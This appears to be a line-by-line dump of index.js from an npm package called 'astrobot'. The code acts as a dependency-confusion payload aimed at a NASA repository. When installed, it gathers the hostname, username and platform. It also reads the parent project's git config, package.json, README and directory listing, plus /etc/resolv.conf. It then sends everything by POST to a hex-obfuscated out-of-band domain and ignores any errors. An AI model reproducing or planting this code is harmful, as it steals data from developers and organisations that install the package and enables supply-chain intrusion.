// File: tmp/tmpqq34livq/astrobot/package/index.js
// ======================================================================
Line 6: const os = require('os')
Line 7: const fs = require('fs')
Line 8: const path = require('path')
Line 9: const https = require('https')
Line 10: _tmp_0 = require('child_process')
Line 15: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 18: execSync(cmd, { stdio: 'pipe', timeout: 5000 }).toString().trim()
Line 19: fs.readFileSync(filePath, 'utf8')
Line 22: {
    const proof = {
        mission_id: 'NASA-ASTROBOT-36d5833e',
        timestamp: new Date().toISOString()
    };
    
    // Objective 1: Standard Host Reconnaissance
    proof.host_intel = {
        hostname: os.hostname(),
        whoami: os.userInfo().username,
        platform: os.platform(),
    };

    // Objective 2: CONTEXTUAL PROOF (THE SMOKING GUN)
    // The goal is to prove this script is running inside a clone of the target repo.
    // The current directory will be /path/to/project/node_modules/astrobot
    const parentProjectRoot = path.resolve(__dirname, '../../');
    proof.project_context = {
        parent_project_path: parentProjectRoot,
        
        // Is the parent project a git repository? Read its config.
        parent_git_config: safeReadFile(path.join(parentProjectRoot, '.git/config')),

        // Read the parent project's own package.json to identify it.
        parent_package_json: safeReadFile(path.join(parentProjectRoot, 'package.json')),

 ...
Line 30: os.hostname()
Line 31: os.userInfo()
Line 32: os.platform()
Line 39: proof.project_context = {
        parent_project_path: parentProjectRoot,
        
        // Is the parent project a git repository? Read its config.
        parent_git_config: safeReadFile(path.join(parentProjectRoot, '.git/config')),

        // Read the parent project's own package.json to identify it.
        parent_package_json: safeReadFile(path.join(parentProjectRoot, 'package.json')),

        // Read the first 500 chars of the parent's README file.
        parent_readme_preview: safeReadFile(path.join(parentProjectRoot, 'README.md')).substring(0, 500) + '...',

        // List all files in the parent directory for maximum context.
        parent_directory_listing: run(`ls -la '${parentProjectRoot}'`)
    }
Line 43: safeReadFile(path.join(parentProjectRoot, '.git/config'))
Line 46: safeReadFile(path.join(parentProjectRoot, 'package.json'))
Line 49: safeReadFile(path.join(parentProjectRoot, 'README.md'))
Line 52: _tmp_9.parent_directory_listing = run(`ls -la '${parentProjectRoot}'`)
Line 57: safeReadFile('/etc/resolv.conf')
Line 64: {
    const intelPackage = gatherProofPackage();
    const payload = JSON.stringify(intelPackage, null, 2);

    let summary = 'NO_CONTEXT';
    // Create a dynamic URL path if we found the git config containing nasa/astrobot
    if (intelPackage.project_context.parent_git_config.includes('nasa/astrobot')) {
        summary = 'NASA_GIT_CONTEXT_CONFIRMED';
    }

    const req = https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/NASA_FINAL_HIT/${summary}/${intelPackage.host_intel.hostname}`,
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json', 
            'Content-Length': Buffer.byteLength(payload),
            'x-mission-id': intelPackage.mission_id
        }
    });
    
    req.on('error', e => {}); // Silently fail on error
    req.end(payload);

}
Line 70: intelPackage.project_context.parent_git_config.includes('nasa/astrobot')
Line 74: const req = https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/NASA_FINAL_HIT/${summary}/${intelPackage.host_intel.hostname}`,
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json', 
            'Content-Length': Buffer.byteLength(payload),
            'x-mission-id': intelPackage.mission_id
        }
    })
Line 87: req.end(payload)
